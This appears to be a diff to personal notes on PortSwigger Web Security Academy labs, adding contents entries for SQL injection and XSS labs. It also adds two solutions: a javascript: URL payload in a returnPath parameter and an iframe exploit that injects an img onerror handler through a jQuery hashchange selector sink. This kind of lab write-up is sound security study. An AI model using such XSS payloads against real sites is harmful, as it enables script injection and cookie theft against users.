@@ -9,11 +9,25 @@
 - [SQL injection](#sql-injection)
   - [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
     - [Check with sqlmap](#check-with-sqlmap)
+    - [Solution:](#solution)
   - [SQL injection vulnerability allowing login bypass](#sql-injection-vulnerability-allowing-login-bypass)
+    - [Solution](#solution)
+- [Cross-site scripting](#cross-site-scripting)
+  - [Lab: Reflected XSS into HTML context with nothing encoded](#lab-reflected-xss-into-html-context-with-nothing-encoded)
+    - [Solution](#solution)
+  - [Lab: Stored XSS into HTML context with nothing encoded](#lab-stored-xss-into-html-context-with-nothing-encoded)
+    - [Solution](#solution)
+  - [Lab: DOM XSS in document.write sink using source location.search](#lab-dom-xss-in-document-write-sink-using-source-location-search)
+    - [Solution](#solution)
+  - [Lab: DOM XSS in innerHTML sink using source location.search](#lab-dom-xss-in-innerhtml-sink-using-source-location-search)
+    - [Solution](#solution)
+  - [DOM XSS in jQuery anchor href attribute sink using location.search source](#dom-xss-in-jquery-anchor-href-attribute-sink-using-location-search-source)
+    - [Solution](#solution)
 - [Information disclosure](#information-disclosure)
   - [Lab: Information disclosure in version control history](#lab-information-disclosure-in-version-control-history)
       - [Download Git Repo](#download-git-repo)
       - [Browse .git repo with command line `git` client](#browse-git-repo-with-command-line-git-client)
+
 
 
 
@@ -109,6 +123,23 @@ Put this into search field:
 > To solve this lab, make the "back" link alert document.cookie.
 
 ### Solution
+
+`https://ac9e1f261f8059e7c0480f4600a40022.web-security-academy.net/feedback?returnPath=javascript:alert(%27hacked%27)`
+
+### Lab: DOM XSS in jQuery selector sink using a hashchange event
+
+> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
+> 
+> To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.
+
+### Solution
+
+![Screenshot 2022-04-29 at 17.08.53](assets/Screenshot%202022-04-29%20at%2017.08.53.png)
+
+
+`<iframe width="100%" height="100%" src="https://ac5f1f911e4329f7c0382ff2007200c0.web-security-academy.net//#" onload="this.src+='<img src=/ onerror=print()>'"></iframe>`
+
+![](assets/16512270029293.png)
 
 
 
